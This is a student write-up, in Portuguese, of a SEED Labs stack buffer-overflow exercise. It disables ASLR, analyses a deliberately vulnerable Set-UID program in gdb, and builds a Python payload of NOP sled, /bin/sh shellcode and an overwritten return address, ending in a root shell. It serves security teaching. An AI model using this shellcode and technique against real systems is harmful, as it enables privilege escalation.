# Trabalho realizado na Semana #5

## **Seed Labs**

## Preparação

### Desativar <em>countermeasures<em>:

Desativar <em>Address Space Randomization<em>:

    $ sudo sysctl -w kernel.randomize_va_space=0

Configurar /bin/sh:

    $ sudo ln -sf /bin/zsh /bin/sh

StackGuard e Non-Executable Stack podem ser desativadas na compilação.

## Tarefa 1

**Objetivo:** Correr os programas a32.out e a64.out (call_shellcode.c) que correm o shellcode de 32-bit e 64-bit respetivamente e descrever o ocorrido.

**Conclusão:** Tal como esperado, os programas SetUID correm o shellcode e executam /bin/sh, abrindo a shell com privilégios de root.

## Tarefa 2

**Objetivo:** Compreender o programa vulnerável

**Procedimento:** Compilar o programa vulnerável, desligando a <em>StackGuard<em> e a proteção de stack não executável. Os comandos necessários para a compilação já estavam incluídos no makefile. Assim, foi apenas necessário escrever make para a execução desses comandos.

**Conclusão:** Observando o programa stack.c, é possível perceber que este abre um ficheiro de input e copia 517 bytes para um char str[517]. É depois chamada a função bof, que recebe um apontador para char. Dentro desta função é usado strcpy que não verifica o tamanho da string a copiar. <br>
Como são alocados apenas 100 bytes para a variável local buffer, e a string de input pode ter até 517 bytes, é possível causar buffer overflow e reescrever o endereço de retorno da função. Como o programa é compilado de um modo que permite a execução na stack, e uma vez que a stack também não está protegida, será possível alterar o endereço de retorno de modo a apontar para shellcode escolhido por nós. Como o programa é Set-UID e o dono é o root, será possível obter uma shell com privilégios root.

    int bof(char *str)
    {
        char buffer[BUF_SIZE];
        /* The following statement has a buffer overflow problem */
        strcpy(buffer, str);
        return 1;
    }

    int main(int argc, char **argv)
    {
        char str[517];
        FILE *badfile;
        badfile = fopen("badfile", "r");
        fread(str, sizeof(char), 517, badfile);
        bof(str);
        printf("Returned Properly\n");
        return 1;
    }

## Tarefa 3

**Objetivo:** Lançar um ataque no programa (32bit)

**Procedimento** Investigar:
1. Usando o gdb podemos descobrir a distância entre a posição de início do buffer e o endereço de retorno: 
        
        gdb stack-L1-dbg
        gdb-peda$ b bof
        Breakpoint 1 at 0x12ad: file stack.c, line 16.
        gdb-peda$ run
        gdb-peda$ next
        ...
        strcpy(buffer, str);
        gdb-peda$ p $ebp
        $1 = (void *) 0xffffc988
        gdb-peda$ p &buffer
        $2 = (char (*)[100]) 0xffffc91c
    Fazendo a diferença entre estes endereços ficamos a saber que a distância entre o frame pointer e a posição de início do buffer é de 108 bytes. Conclui-se que o endereço de retorno se encontra a 112 bytes de distância da posição de início do frame pointer, pois o tamanho do frame pointer é 4.

2. Sabendo esta distância, podemos verificar que é possível alterar o endereço de retorno. Para isso utilizamos o seguinte código python para gerar o ficheiro de input ("badfile"):
3. 
        #Código Python file_builder.py
        address = '\xdd\xcc\xbb\xaa' 
        nop = '\x90'
        print(nop*(112) + address)

    Correndo este script python para o ficheiro badfile e correndo o programa vulnerável com o gdb podemos verificar que é causado segmentation fault e vemos o nosso endereço (0xaabbccdd):

        python file_builder.py > badfile
        gdb stack-L1-dbg 
        gdb-peda$ run
        ...
        Stopped reason: SIGSEGV
        0xaabbccdd in ?? ()

4. Agora que sabemos onde colocar o endereço de retorno podemos colocar o nosso shellcode na payload, bem como alterar o endereço para apontar para o início do buffer. Este endereço será superior ao endereço obtido usando o gdb, pois este acrescenta variáveis na stack, logo usamos um endereço mais alto: xffffc9c0.

        #Código Python file_builder.py
        shellcode = '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'

        address = '\xc0\xc9\xff\xff' #xffffc9c0

        nop = '\x90'

        print(nop*(112-len(shellcode)) + shellcode + address)
        #address estará na posição 112 do buffer
        #o buffer é preenchido com NOP até chegar ao shellcode

5. Lançar o ataque:

        python file_builder.py > badfile
        ./stack-L1
        # id                                                                           
        uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)

